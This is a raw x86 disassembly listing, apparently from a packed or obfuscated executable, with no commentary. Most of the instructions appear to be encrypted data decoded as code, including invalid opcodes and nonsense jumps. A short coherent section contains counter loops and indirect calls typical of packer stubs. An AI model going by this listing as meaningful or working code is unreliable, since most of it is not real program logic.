  40a658:	or     eax,0x427f09f4
  40a65d:	adc    BYTE PTR [edi-0x30],dl
  40a660:	lds    ebp,FWORD PTR [edi+0x5eb83870]
  40a666:	popf   
  40a667:	push   es
  40a668:	mov    eax,0x2faf6323
  40a66d:	sub    eax,0xa1c23374
  40a672:	cmp    al,0x17
  40a674:	add    eax,0x98018f41
  40a679:	mov    eax,ds:0x91354177
  40a67e:	pop    esp
  40a67f:	imul   ecx,DWORD PTR [ebp+0x40],0xa7df477
  40a686:	push   edx
  40a687:	fidivr WORD PTR [esi+0x3f]
  40a68a:	les    eax,FWORD PTR ds:0xd1b54637
  40a690:	pop    ebx
  40a691:	out    0xb4,eax
  40a693:	(bad)  
  40a695:	jae    0x40a6e6
  40a697:	push   ecx
  40a698:	dec    edi
  40a699:	cdq    
  40a69a:	in     al,0x59
  40a69c:	les    ebx,FWORD PTR [ebp+0x48]
  40a69f:	and    eax,0x85322aca
  40a6a4:	dec    eax
  40a6a5:	fisttp WORD PTR [edi+0x36]
  40a6a8:	sbb    eax,0x6089c9a4
  40a6ad:	icebp  
  40a6ae:	pop    eax
  40a6af:	dec    ebp
  40a6b0:	push   ss
  40a6b1:	mov    dh,0xf
  40a6b3:	add    cl,ah
  40a6b5:	std    
  40a6b6:	and    edx,DWORD PTR [eax+edi*2-0x6a]
  40a6ba:	add    edi,DWORD PTR [eax]
  40a6bc:	sub    ch,BYTE PTR [ecx+0x7b]
  40a6bf:	stos   BYTE PTR es:[edi],al
  40a6c0:	enter  0x6545,0x8e
  40a6c4:	xor    DWORD PTR [esi],edx
  40a6c6:	mov    ecx,DWORD PTR [ebp-0x7e]
  40a6c9:	cmp    dh,al
  40a6cb:	dec    eax
  40a6cc:	mov    esp,0xdc559145
  40a6d1:	and    ebx,DWORD PTR [ecx+ebp*2]
  40a6d4:	mov    BYTE PTR [eiz*8-0x4ca372bb],0x60
  40a6dc:	cwde   
  40a6dd:	jl     0x40a712
  40a6df:	aas    
  40a6e0:	add    edx,DWORD PTR [edx]
  40a6e2:	inc    esp
  40a6e3:	xor    dl,cl
  40a6e5:	(bad)  
  40a6e6:	sub    eax,0xabfdd09
  40a6eb:	add    bh,BYTE PTR [ecx-0x52aba857]
  40a6f1:	xchg   edi,eax
  40a6f2:	pop    edi
  40a6f3:	xchg   ebx,eax
  40a6f4:	jo     0x40a76e
  40a6f6:	lods   al,BYTE PTR ds:[esi]
  40a6f7:	and    ch,bl
  40a6f9:	cs das 
  40a6fb:	push   ebp
  40a6fc:	(bad)  
  40a6fd:	lock or BYTE PTR [edx],ch
  40a700:	dec    edx
  40a701:	out    dx,eax
  40a702:	mov    ah,0xe0
  40a704:	dec    esi
  40a705:	xchg   edx,eax
  40a706:	jp     0x40a6ac
  40a708:	push   ds
  40a709:	aas    
  40a70a:	mov    ch,0x18
  40a70c:	cmp    al,0xaf
  40a70e:	xchg   ebp,eax
  40a70f:	repnz dec BYTE PTR [esi]
  40a712:	icebp  
  40a713:	bound  edx,QWORD PTR [edi+ebx*2-0xa803670]
  40a71a:	xchg   ebp,eax
  40a71b:	mov    esi,0xf94314e6
  40a720:	mov    ebx,edx
  40a722:	fistp  QWORD PTR [eax+eax*1+0x44]
  40a726:	imul   edi,edi,0xffffffdf
  40a729:	mov    al,0xeb
  40a72b:	enter  0x4a05,0x3f
  40a72f:	ins    DWORD PTR es:[edi],dx
  40a730:	fs cmp al,0xfb
  40a733:	cmp    al,0xd7
  40a735:	icebp  
  40a736:	(bad)  
  40a738:	jns    0x40a71b
  40a73a:	jl     0x40a6e4
  40a73c:	pop    ebx
  40a73d:	adc    al,0xea
  40a73f:	fistp  DWORD PTR [edi+0x55]
  40a742:	and    al,dl
  40a744:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a745:	jnp    0x40a703
  40a747:	cli    
  40a748:	int3   
  40a749:	cli    
  40a74a:	pop    ecx
  40a74b:	cli    
  40a74c:	ins    BYTE PTR es:[edi],dx
  40a74d:	jecxz  0x40a76c
  40a74f:	inc    esp
  40a750:	mov    DWORD PTR [ebp+0x1c194dc1],ebx
  40a756:	or     al,0x35
  40a758:	je     0x40a737
  40a75a:	sub    esi,ecx
  40a75c:	lahf   
  40a75d:	xchg   edx,eax
  40a75e:	les    esp,FWORD PTR [edx]
  40a760:	xchg   ebx,eax
  40a761:	(bad)  
  40a762:	nop
  40a763:	xlat   BYTE PTR ds:[ebx]
  40a764:	mov    esi,0xdde6e641
  40a769:	pop    ds
  40a76a:	mov    bh,0xcb
  40a76c:	pop    ss
  40a76d:	outs   dx,DWORD PTR ds:[esi]
  40a76e:	dec    esp
  40a76f:	mov    ds:0x994b4a13,eax
  40a774:	test   DWORD PTR [ecx-0x50],0xd7771904
  40a77b:	mov    gs,WORD PTR [edx]
  40a77d:	adc    ch,BYTE PTR [ebx+0x1a885894]
  40a783:	popa   
  40a784:	shr    ebp,1
  40a786:	jne    0x40a756
  40a788:	mov    eax,ds:0xcb451112
  40a78d:	cmp    ebx,DWORD PTR ds:0xc4193ebe
  40a793:	xor    DWORD PTR [eax+ebx*8-0x5c5e4bab],edi
  40a79a:	inc    ecx
  40a79b:	dec    esi
  40a79c:	out    0xc8,ax
  40a79f:	jge    0x40a7ed
  40a7a1:	xlat   BYTE PTR ds:[ebx]
  40a7a2:	ins    DWORD PTR es:[edi],dx
  40a7a3:	mov    edx,0x7895caa9
  40a7a8:	mov    al,ds:0x924b649e
  40a7ad:	test   eax,0x43b5a7a5
  40a7b2:	and    al,0xb0
  40a7b4:	js     0x40a7c1
  40a7b6:	push   ebp
  40a7b7:	cdq    
  40a7b8:	dec    edx
  40a7b9:	pop    ecx
  40a7ba:	push   ss
  40a7bb:	cdq    
  40a7bc:	jl     0x40a7c5
  40a7be:	mov    al,0x16
  40a7c0:	pop    ss
  40a7c1:	cmp    ch,BYTE PTR [ebx-0x5962e3aa]
  40a7c7:	xor    bh,bl
  40a7c9:	ins    BYTE PTR es:[edi],dx
  40a7ca:	outs   dx,BYTE PTR ds:[esi]
  40a7cb:	outs   dx,BYTE PTR ds:[esi]
  40a7cc:	out    0xb2,al
  40a7ce:	sbb    cl,BYTE PTR [ebp+0x5a]
  40a7d1:	call   0x8f6d6124
  40a7d6:	cli    
  40a7d7:	dec    esi
  40a7d8:	mov    dh,BYTE PTR [eax]
  40a7da:	retf   
  40a7db:	das    
  40a7dc:	aad    0xeb
  40a7de:	or     eax,0x5361f52c
  40a7e3:	inc    ecx
  40a7e4:	push   cs
  40a7e5:	adc    eax,DWORD PTR [ebp-0x5466471]
  40a7eb:	mov    dl,0xd2
  40a7ed:	or     eax,0xba04f7f2
  40a7f2:	sub    esp,DWORD PTR [ebp-0x3a]
  40a7f5:	mov    al,0x5d
  40a7f7:	or     al,0xe0
  40a7f9:	mov    eax,ds:0x99f8e815
  40a7fe:	dec    esp
  40a7ff:	into   
  40a800:	xchg   esp,eax
  40a801:	fcomp  DWORD PTR [eax+0x37]
  40a804:	ja     0x40a7d9
  40a806:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  40a808:	mov    ebx,DWORD PTR [ebp+ebp*4-0x2fe72f7e]
  40a80f:	popa   
  40a810:	in     al,dx
  40a811:	dec    ebp
  40a812:	push   eax
  40a813:	dec    esp
  40a814:	push   ss
  40a815:	shl    BYTE PTR [edi+0x43],1
  40a818:	and    al,0x2f
  40a81a:	movaps XMMWORD PTR [eax+0x2e2eaee3],xmm7
  40a821:	dec    ebx
  40a822:	fld    TBYTE PTR [ebx+0x49769217]
  40a828:	into   
  40a829:	jmp    0xaaa:0xeb906a1c
  40a830:	cdq    
  40a831:	shr    BYTE PTR [ecx],1
  40a833:	js     0x40a871
  40a835:	mov    eax,ecx
  40a837:	xor    eax,DWORD PTR [ecx+edi*1]
  40a83a:	add    al,BYTE PTR [edx-0x1ce75c33]
  40a840:	xor    BYTE PTR [edi+0x2f],ah
  40a843:	(bad)  
  40a844:	push   esp
  40a845:	in     eax,dx
  40a846:	ja     0x40a8a1
  40a848:	pop    ecx
  40a849:	hlt    
  40a84a:	(bad)  
  40a84b:	and    ecx,DWORD PTR [ebx]
  40a84d:	lea    eax,[ebp-0x18]
  40a850:	mov    DWORD PTR [ebp-0x24],eax
  40a853:	xor    DWORD PTR ds:0x43045d,0x5f13
  40a85d:	mov    eax,DWORD PTR [ebp-0x18]
  40a860:	and    DWORD PTR ds:0x430469,0x0
  40a86a:	jmp    0x40a87c
  40a86f:	mov    ebx,DWORD PTR ds:0x430469
  40a875:	inc    ebx
  40a876:	mov    DWORD PTR ds:0x430469,ebx
  40a87c:	cmp    DWORD PTR ds:0x430469,0x10
  40a883:	jae    0x40a8ac
  40a889:	cmp    DWORD PTR ds:0x430469,0x13
  40a890:	jne    0x40a8a1
  40a896:	push   0x42e8fb
  40a89b:	call   DWORD PTR ds:0x42ec3f
  40a8a1:	jmp    0x40a86f
  40a8a6:	and    DWORD PTR ds:0x430465,edx
  40a8ac:	mov    ecx,DWORD PTR [ebp-0x24]
  40a8af:	xor    eax,esi
  40a8b1:	add    DWORD PTR ds:0x4304eb,0x2a87
  40a8bb:	add    eax,edi
  40a8bd:	sub    ebx,DWORD PTR ds:0x43046d
  40a8c3:	mov    DWORD PTR [ecx],eax
  40a8c5:	and    DWORD PTR ds:0x42e7d4,0x0
  40a8cf:	jmp    0x40a8e1
  40a8d4:	mov    ebx,DWORD PTR ds:0x42e7d4
  40a8da:	inc    ebx
  40a8db:	mov    DWORD PTR ds:0x42e7d4,ebx
  40a8e1:	cmp    DWORD PTR ds:0x42e7d4,0x1d
  40a8e8:	jae    0x40ac77
  40a8ee:	cmp    DWORD PTR ds:0x42e7d4,0x11
  40a8f5:	jne    0x40a90b
  40a8fb:	push   0x2475
  40a900:	push   0x8142
  40a905:	call   DWORD PTR ds:0x42ea07
  40a90b:	cmp    DWORD PTR ds:0x42e7d4,0x10
  40a912:	jne    0x40a925
  40a918:	mov    ebx,DWORD PTR ds:0x42e7d4
  40a91e:	inc    ebx
  40a91f:	mov    DWORD PTR ds:0x42e7d4,ebx
  40a925:	jmp    0x40a8d4
  40a92a:	jmp    0x40ac77
  40a92f:	fsubr  QWORD PTR [esi-0x17]
  40a932:	or     eax,0x6fd88969
  40a937:	pop    eax
  40a938:	or     BYTE PTR [edx-0x4e275187],bl
  40a93e:	cld    
  40a93f:	cdq    
  40a940:	loope  0x40a9c0
  40a942:	jle    0x40a972
  40a944:	jge    0x40a9c4
  40a946:	jle    0x40a8dd
  40a948:	mov    al,0x1a
  40a94a:	adc    BYTE PTR [esi-0x591dea5f],bh
  40a950:	lods   al,BYTE PTR ds:[esi]
  40a951:	or     eax,0x2ded3492
  40a956:	lds    edi,FWORD PTR [ebx+ebx*2+0x604ad468]
  40a95d:	idiv   BYTE PTR [ecx+0x3f58b72]
  40a963:	cmp    BYTE PTR [ecx+0x41c6588e],0x33
  40a96a:	cmc    
  40a96b:	cmp    ebx,DWORD PTR [edi]
  40a96d:	adc    esi,edx
  40a96f:	scas   eax,DWORD PTR es:[edi]
  40a970:	enter  0x25d2,0x9b
  40a974:	int    0xde
  40a976:	push   edi
  40a977:	push   cs
  40a978:	pop    eax
  40a979:	in     eax,0x7c
  40a97b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a97c:	fidivr DWORD PTR [ecx]
  40a97e:	add    al,0x1c
  40a980:	(bad)  
  40a982:	mov    eax,0xa4295f
  40a987:	xor    BYTE PTR [eax-0x5b6debf],al
  40a98d:	jmp    0xa64d:0x4b778068
  40a994:	in     eax,dx
  40a995:	pop    ds
  40a996:	clc    
  40a997:	test   dl,dh
  40a999:	leave  
  40a99a:	ins    BYTE PTR es:[edi],dx
  40a99b:	rol    BYTE PTR [ebx],0x6e
  40a99e:	or     eax,0xc374ef5
  40a9a3:	push   0x5cd6648e
  40a9a8:	mov    ds:0x386d2f8b,eax
  40a9ad:	test   DWORD PTR [eax-0x49986ebc],eax
  40a9b3:	push   0x8a61889c
  40a9b8:	add    DWORD PTR [edi+0x2e],ecx
  40a9bb:	add    BYTE PTR [esi],ch
  40a9bd:	outs   dx,BYTE PTR ds:[esi]
  40a9be:	fdiv   QWORD PTR [ebx+0x1c0e7f5f]
  40a9c4:	rcl    BYTE PTR [ecx],cl
  40a9c6:	in     eax,dx
  40a9c7:	push   0x6a
  40a9c9:	mov    cl,0xb0
  40a9cb:	fdivr  st(4),st
  40a9cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a9ce:	loop   0x40a9b6
  40a9d0:	add    ebp,DWORD PTR [edx]
  40a9d2:	mov    dh,0xc4
  40a9d4:	shr    BYTE PTR [eax],cl
  40a9d6:	cld    
  40a9d7:	xchg   esp,eax
  40a9d8:	push   esi
  40a9d9:	ficom  WORD PTR [eax+0x25]
  40a9dc:	mov    ?,WORD PTR [edi+0x45]
  40a9df:	call   0x9ca4:0xe5fb4caf
  40a9e6:	xchg   esi,eax
  40a9e7:	loop   0x40a999
  40a9e9:	pop    esi
  40a9ea:	sbb    al,0x90
  40a9ec:	outs   dx,BYTE PTR ds:[esi]
  40a9ed:	icebp  
  40a9ee:	setne  BYTE PTR [ebp+0x4efca3dc]
  40a9f5:	jg     0x40aa22
  40a9f7:	test   al,0x4d
  40a9f9:	(bad)  
  40a9fa:	ds gs dec esp
  40a9fd:	mov    dl,0xa8
  40a9ff:	sub    al,dh
  40aa01:	shl    BYTE PTR [edi+0x2fb72093],0x24
  40aa08:	(bad)  
  40aa09:	or     dl,BYTE PTR [edx+0x6c30edaa]
  40aa0f:	dec    ebx
  40aa10:	pusha  
  40aa11:	clc    
  40aa12:	or     al,0xd2
  40aa14:	repz (bad) 
  40aa16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aa17:	mov    ch,BYTE PTR [ebx+0xdaa1b36]
  40aa1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aa1e:	popa   
  40aa1f:	fwait
  40aa20:	add    ebx,DWORD PTR [eax]
  40aa22:	or     BYTE PTR [edi-0xbede0fd],cl
  40aa28:	jae    0x40aa09
  40aa2a:	mov    dl,0x9e
  40aa2c:	rcr    ah,cl
  40aa2e:	cmp    al,0xe2
  40aa30:	ins    DWORD PTR es:[edi],dx
  40aa31:	jg     0x40aa6d
  40aa33:	inc    edi
  40aa34:	out    0x8,al
  40aa36:	mov    ch,0xcc
  40aa38:	adc    ah,BYTE PTR [ecx+ecx*8-0x18]
  40aa3c:	aaa    
  40aa3d:	cmc    
  40aa3e:	mov    BYTE PTR [esi+0x40],bh
  40aa41:	push   es
  40aa42:	mov    eax,ds:0xc68ef5e8
  40aa47:	jge    0x40a9d1
  40aa49:	mov    ah,0x1c
  40aa4b:	enter  0xc734,0x1
  40aa4f:	aad    0xea
  40aa51:	or     DWORD PTR [eax+0x57],0x3efaddc7
  40aa58:	adc    DWORD PTR [edi+0x57],ecx
  40aa5b:	lods   al,BYTE PTR ds:[esi]
  40aa5c:	imul   edi,DWORD PTR [edi+0x36429aaa],0x571d0754
  40aa66:	push   ebp
  40aa67:	mov    eax,0x4b4b89e2
  40aa6c:	mov    edx,0x980f951a
  40aa71:	pop    eax
  40aa72:	ja     0x40aad7
  40aa74:	sar    BYTE PTR [ebp+0x61],1
  40aa77:	xchg   ebp,eax
  40aa78:	sub    edi,DWORD PTR [edx]
  40aa7a:	fidivr WORD PTR [esi+0x76]
  40aa7d:	sub    BYTE PTR [edi-0x1b],bl
  40aa80:	aas    
  40aa81:	xor    BYTE PTR [eax+0x43c75ced],0x9d
  40aa88:	hlt    
  40aa89:	xchg   cx,ax
  40aa8b:	(bad)  
  40aa8c:	jmp    0x40aabb
  40aa8e:	mov    al,0x26
  40aa90:	dec    edi
  40aa91:	jle    0x40aa35
  40aa93:	mov    WORD PTR ds:0xcca1175e,es
  40aa99:	xor    DWORD PTR ds:0x30a14a56,esp
  40aa9f:	ins    BYTE PTR es:[edi],dx
  40aaa0:	adc    ebp,DWORD PTR [esi]
  40aaa2:	daa    
  40aaa3:	loop   0x40aa80
  40aaa5:	mov    WORD PTR [edx],si
  40aaa8:	dec    esp
  40aaa9:	pop    ebx
  40aaaa:	xchg   edx,eax
  40aaab:	inc    DWORD PTR [eax]
  40aaad:	push   0x262a8eda
  40aab2:	mov    ebp,0x6de597ec
  40aab7:	pop    esp
  40aab8:	mov    edi,DWORD PTR [eax+0x78dc7a4f]
  40aabe:	(bad)  
  40aabf:	das    
  40aac0:	cwde   
  40aac1:	pop    ds
  40aac2:	mov    ebp,0x8aa7c47
  40aac7:	xchg   edx,eax
  40aac8:	je     0x40ab14
  40aaca:	fist   DWORD PTR [bp+di+0x57]
  40aace:	sub    eax,0x256f1a36
  40aad3:	and    esp,DWORD PTR [eax-0x5b9b8eee]
  40aad9:	ret    
  40aada:	dec    edx
  40aadb:	cld    
  40aadc:	fstp   DWORD PTR [ecx+0x4f3b8e15]
  40aae2:	mov    edi,0x3dfca037
  40aae7:	in     eax,dx
  40aae8:	jae    0x40ab05
  40aaea:	fmul   QWORD PTR [esi]
  40aaec:	aas    
  40aaed:	sti    
  40aaee:	sbb    bh,bh
  40aaf0:	pop    ebx
  40aaf1:	fwait
  40aaf2:	lods   eax,DWORD PTR ds:[esi]
  40aaf3:	popw   ds
  40aaf5:	and    esi,DWORD PTR [esi]
  40aaf7:	ins    DWORD PTR es:[edi],dx
  40aaf8:	sbb    eax,0xc2de6318
  40aafd:	inc    esi
  40aafe:	sub    al,0x4c
  40ab00:	les    ebx,FWORD PTR [ebp+0x554cd227]
  40ab06:	xchg   esi,eax
  40ab07:	je     0x40aabd
  40ab09:	jle    0x40ab76
  40ab0b:	push   edi
  40ab0c:	neg    DWORD PTR [edx]
  40ab0e:	stc    
  40ab0f:	fistp  WORD PTR [ebp*1-0x144237fa]
  40ab16:	mov    ah,BYTE PTR [ebx+0x3b]
  40ab19:	mov    ch,BYTE PTR [ecx-0x25]
  40ab1c:	jnp    0x40ab74
  40ab1e:	and    bl,dl
  40ab20:	lods   al,BYTE PTR ds:[esi]
  40ab21:	mov    al,0xdf
  40ab24:	or     BYTE PTR [esi-0x7e],al
  40ab27:	loopne 0x40ab2a
  40ab29:	inc    edi
  40ab2a:	push   ecx
  40ab2b:	gs fdivp st(1),st
  40ab2e:	mov    ss,WORD PTR [esi-0x8]
  40ab31:	test   eax,0x6af3f6a0
  40ab36:	dec    eax
  40ab37:	cmc    
  40ab38:	or     DWORD PTR [edx],esi
  40ab3a:	test   DWORD PTR [eax],ebx
  40ab3c:	inc    eax
  40ab3d:	push   ds
  40ab3e:	popf   
  40ab3f:	dec    esi
  40ab40:	ins    DWORD PTR es:[edi],dx
  40ab41:	pop    ss
  40ab42:	pop    ebp
  40ab43:	cli    
  40ab44:	jno    0x40ab3f
  40ab46:	repz mov bl,0xe3
  40ab49:	int3   
  40ab4a:	xor    ch,BYTE PTR [ecx-0x7c]
  40ab4d:	xor    eax,0xeb2162a5
  40ab53:	sub    ebx,DWORD PTR [edi+0x3b8767b7]
  40ab59:	xchg   al,bl
  40ab5b:	in     al,0xfd
  40ab5d:	xor    ch,BYTE PTR [edx+0x4f885024]
  40ab63:	add    ch,ah
  40ab65:	test   eax,0x207278a5
  40ab6a:	mov    DWORD PTR [ebx],esi
  40ab6c:	(bad)  
  40ab6d:	pop    esp
  40ab6e:	rcr    edx,1
  40ab70:	call   DWORD PTR [eax+0x7a5f297d]
  40ab76:	adc    BYTE PTR [edi+0x36],dh
  40ab79:	mov    ah,0xa4
  40ab7b:	xlat   BYTE PTR ds:[ebx]
  40ab7c:	pop    esp
  40ab7d:	jo     0x40ab96
  40ab7f:	pop    es
  40ab80:	jae    0x40ab72
  40ab82:	fs in  al,dx
  40ab84:	mov    edi,0x7c7c05ed
  40ab89:	add    DWORD PTR [edi+0x5437a386],ebx
  40ab8f:	cmp    eax,0x3fac5175
  40ab94:	xor    DWORD PTR [ebp+ebp*2+0x309596d8],ebx
  40ab9b:	sbb    DWORD PTR [ecx-0x1f],edi
  40ab9e:	retf   0xc742
  40aba1:	fcom   st(4)
  40aba3:	push   edx
  40aba4:	cmp    BYTE PTR ds:0xc73f36c0,dl
  40abaa:	ror    BYTE PTR [ebx-0x46dd6672],cl
  40abb0:	or     ch,al
  40abb2:	push   0x68
  40abb4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40abb5:	cmp    bl,dh
  40abb7:	scas   al,BYTE PTR es:[edi]
  40abb8:	jne    0x40ac1b
  40abba:	xchg   esp,eax
  40abbb:	push   cs
  40abbc:	mov    al,0x2e
  40abbe:	jbe    0x40abd9
  40abc0:	and    eax,0x5256ed2e
  40abc5:	or     esp,DWORD PTR [ecx]
  40abc7:	sbb    esp,ebp
  40abc9:	mov    eax,0x24852462
  40abce:	lods   al,BYTE PTR ds:[esi]
  40abcf:	xchg   ebp,eax
  40abd0:	icebp  
  40abd1:	xlat   BYTE PTR ds:[ebx]
  40abd2:	sub    DWORD PTR [ecx+ebp*2-0x218a8b26],edx
  40abd9:	lds    esi,FWORD PTR [edx-0x21]
  40abdc:	rol    BYTE PTR [edx+0x6f7be10a],1
  40abe2:	inc    eax
  40abe3:	dec    edx
  40abe4:	push   cs
  40abe5:	mov    cl,0xf7
  40abe7:	xchg   DWORD PTR [ebx-0x68],ebp
  40abea:	je     0x40ac1e
  40abec:	ret    
  40abed:	(bad)  
  40abee:	scas   al,BYTE PTR es:[edi]
  40abef:	nop
  40abf0:	xchg   esi,eax
  40abf1:	fdiv   DWORD PTR [ebx+0x6c]
  40abf4:	mov    eax,0x516faa5c
  40abf9:	push   eax
  40abfa:	and    eax,0xfcfe09bb
  40abff:	sub    dh,cl
  40ac01:	mov    edx,0x81582d07
  40ac06:	je     0x40abed
  40ac08:	repnz cmp eax,0x7e15ea90
  40ac0e:	mov    bh,0xdb
  40ac10:	retf   
  40ac11:	in     al,dx
  40ac12:	and    eax,0x8c70614
  40ac17:	sub    al,BYTE PTR [ebx+0x60]
  40ac1a:	arpl   WORD PTR ds:0x97254e33,bx
  40ac20:	push   0x6d49b28c
  40ac25:	sbb    sp,WORD PTR [ebx+0x48]
  40ac29:	test   eax,0x17abb3e8
  40ac2e:	sbb    DWORD PTR [edi+0x6c08cb5b],esi
  40ac34:	jp     0x40ac58
  40ac36:	cmp    esi,DWORD PTR [ecx+0x66]
  40ac39:	jge    0x40abd9
  40ac3b:	jmp    0xa0bad8f0
  40ac40:	rcl    esp,cl
  40ac42:	(bad)  
  40ac43:	mov    fs,WORD PTR [ecx-0x76]
  40ac46:	enter  0x4efd,0x97
  40ac4a:	jb     0x40ac08
  40ac4c:	or     al,0xd7
  40ac4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ac4f:	xor    BYTE PTR [esi+0x475cff66],0x86
  40ac56:	aas    
  40ac57:	inc    eax
  40ac58:	add    eax,0x56712d0f
  40ac5d:	jb     0x40ac64
  40ac5f:	ins    DWORD PTR es:[edi],dx
  40ac60:	push   es
  40ac61:	mov    bh,0x3c
  40ac63:	out    dx,eax
  40ac64:	fadd   QWORD PTR [ecx]
  40ac66:	es cli 
  40ac68:	fldz   
  40ac6a:	dec    ecx
  40ac6b:	fcmovnbe st,st(3)
  40ac6d:	mov    edi,0x1c768c22
  40ac72:	pop    ecx
  40ac73:	call   0xa1761fa9
  40ac78:	jl     0x40ac9c
  40ac7a:	inc    ecx
  40ac7b:	add    BYTE PTR [ebx-0x71ed0148],bh
  40ac81:	jmp    0x40afce
  40ac86:	leave  
  40ac87:	inc    edx
  40ac88:	mov    ebp,0xd1515553
  40ac8d:	inc    eax
  40ac8e:	xor    ch,ah
  40ac90:	icebp  
  40ac91:	pushf  
  40ac92:	cld    
  40ac93:	and    BYTE PTR [ecx+eiz*4+0x49],cl
  40ac97:	in     al,dx
  40ac98:	jle    0x40ad18
  40ac9a:	cs jge 0x40ad1b
  40ac9d:	jle    0x40ac3f
  40ac9f:	sahf   
  40aca0:	pop    edx
  40aca1:	test   al,0xda
  40aca3:	dec    eax
  40aca4:	sti    
  40aca5:	cmp    esi,DWORD PTR [ecx]
  40aca7:	or     eax,edx
  40aca9:	in     al,dx
  40acaa:	jnp    0x40ac4a
  40acac:	push   ebx
  40acad:	fsub   QWORD PTR [eax+0x7c38f12b]
  40acb3:	mov    ds:0x1b27882e,al
  40acb8:	stc    
  40acb9:	jle    0x40ace4
  40acbb:	adc    BYTE PTR [edx+edx*2+0x3b0650df],ah
  40acc2:	pushf  
  40acc3:	stc    
  40acc4:	test   BYTE PTR [esi],bl
  40acc6:	pop    edx
  40acc7:	imul   ebp,ebx,0x232e3b8d
  40accd:	adc    esi,DWORD PTR [ecx]
  40accf:	inc    ebx
  40acd0:	shl    edx,0xc9
  40acd3:	test   al,0x2b
  40acd5:	push   eax
  40acd6:	mov    esi,0xb98d6ef8
  40acdb:	xchg   BYTE PTR [ebx-0x2f],bl
  40acde:	ror    DWORD PTR [ecx-0x20],0x8a
  40ace2:	mov    cl,0xae
  40ace4:	dec    DWORD PTR [ebp+0x2a]
  40ace7:	mov    BYTE PTR [edi+ecx*4+0x68],dh
  40aceb:	movsx  ebx,dx
  40acee:	dec    edx
  40acef:	push   ds
  40acf0:	sub    eax,0x932a7b5f
  40acf5:	jo     0x40ad1f
  40acf7:	mov    eax,0x6499f85d
  40acfc:	mov    bh,0x90
  40acfe:	lahf   
  40acff:	loope  0x40acb9
  40ad01:	jge    0x40acdb
  40ad03:	in     eax,dx
  40ad04:	mov    ebx,0xa530d574
  40ad09:	adc    bh,BYTE PTR [ecx]
  40ad0b:	bswap  ebp
  40ad0d:	arpl   WORD PTR [esi+0x62],ax
  40ad10:	popa   
  40ad11:	and    bh,0x41
  40ad14:	or     eax,0x59efd18b
  40ad19:	and    edx,eax
  40ad1b:	cmp    BYTE PTR [ebp-0x14],ch
  40ad1e:	(bad)  
  40ad1f:	(bad)  
  40ad20:	lock inc esp
  40ad22:	sub    edx,DWORD PTR [edx]
  40ad24:	add    al,0x1a
  40ad26:	enter  0x3841,0xdf
  40ad2a:	pop    es
  40ad2b:	or     DWORD PTR [ebx],esp
  40ad2d:	retf   0x7092
  40ad30:	push   0xffffffba
  40ad32:	dec    esi
  40ad33:	pushf  
  40ad34:	dec    ebx
  40ad35:	dec    ecx
  40ad36:	mov    WORD PTR [edx+eax*8+0x5bc79cfc],ss
  40ad3d:	mov    dl,0x6e
  40ad3f:	xchg   edi,eax
  40ad40:	mov    ebp,0x73f532a3
  40ad45:	xchg   edx,eax
  40ad46:	dec    ebp
  40ad47:	sub    eax,0xa9d417cc
  40ad4c:	inc    ebp
  40ad4d:	jo     0x40ad84
  40ad4f:	jg     0x40adc5
  40ad51:	ret    
  40ad52:	pushf  
  40ad53:	aaa    
  40ad54:	pop    es
  40ad55:	and    esi,ecx
  40ad57:	aas    
  40ad58:	dec    esi
  40ad59:	(bad)  
  40ad5a:	je     0x40addb
  40ad5c:	(bad)  
  40ad5d:	cmp    DWORD PTR [edi],eax
  40ad5f:	fs (bad) 
  40ad61:	sbb    BYTE PTR [edx+0x5a],ah
  40ad64:	mov    edi,0x8f35e353
  40ad69:	or     bh,ch
  40ad6b:	lock dec ecx
  40ad6d:	mov    cl,0x9e
  40ad6f:	jne    0x40ad4b
  40ad71:	mov    ah,0xc
  40ad73:	jae    0x40acf7
  40ad75:	push   edi
  40ad76:	adc    DWORD PTR [edx-0x4bf71506],edi
  40ad7c:	mov    bl,0x98
  40ad7e:	and    ah,al
  40ad80:	in     al,dx
  40ad81:	sahf   
  40ad82:	dec    esp
  40ad83:	jmp    0x40ade2
  40ad85:	and    DWORD PTR [edx-0x7b5d1c9c],0x3880e90c
  40ad8f:	mov    dh,0xa8
  40ad91:	inc    ecx
  40ad92:	push   0x32a7b5df
  40ad97:	aaa    
  40ad98:	(bad)  
  40ad99:	loop   0x40ad47
  40ad9b:	or     DWORD PTR [esi-0x3bb86430],eax
  40ada1:	xor    eax,0xf2051282
  40ada6:	adc    eax,0x667bce8f
  40adab:	cmp    bh,ah
  40adad:	mov    ds:0xaa6f75bc,eax
  40adb2:	sub    DWORD PTR [ebx],esp
  40adb4:	std    
  40adb5:	stos   BYTE PTR es:[edi],al
  40adb6:	xor    DWORD PTR [ebx],eax
  40adb8:	cs mov edx,0xa2975d00
  40adbe:	mov    ecx,0xd9e67ffe
  40adc3:	scas   al,BYTE PTR es:[edi]
  40adc4:	hlt    
  40adc5:	data16 xlat BYTE PTR ds:[ebx]
  40adc7:	or     eax,0x9284f2a4
  40adcc:	fidivr DWORD PTR [ecx]
  40adce:	in     eax,dx
  40adcf:	xchg   ecx,eax
  40add0:	jb     0x40adc8
  40add2:	mov    BYTE PTR [ebx+0x2c4964a2],dl
  40add8:	pop    esp
  40add9:	add    eax,0x6db39dec
  40adde:	cmp    DWORD PTR [ebp-0xd594218],esp
  40ade4:	iret   
  40ade5:	add    al,0xe
  40ade7:	loop   0x40ae5d
  40ade9:	cs jge 0x40ae15
  40adec:	mov    ebp,0x2e013411
  40adf1:	js     0x40ad84
  40adf3:	ret    
  40adf4:	jge    0x40add0
  40adf6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40adf7:	xchg   esp,eax
  40adf8:	cli    
  40adf9:	mov    ch,0xf9
  40adfc:	pop    ds
  40adfd:	inc    edi
  40adfe:	leave  
  40adff:	push   0x733a6152
  40ae04:	push   es
  40ae05:	test   al,0xb8
  40ae07:	(bad)  
  40ae08:	cmp    edx,edx
  40ae0a:	xchg   esp,eax
  40ae0b:	outs   dx,BYTE PTR ds:[esi]
  40ae0c:	rcl    BYTE PTR [edx-0x48],0xad
  40ae10:	mov    bl,0xf5
  40ae12:	mov    dh,0xa8
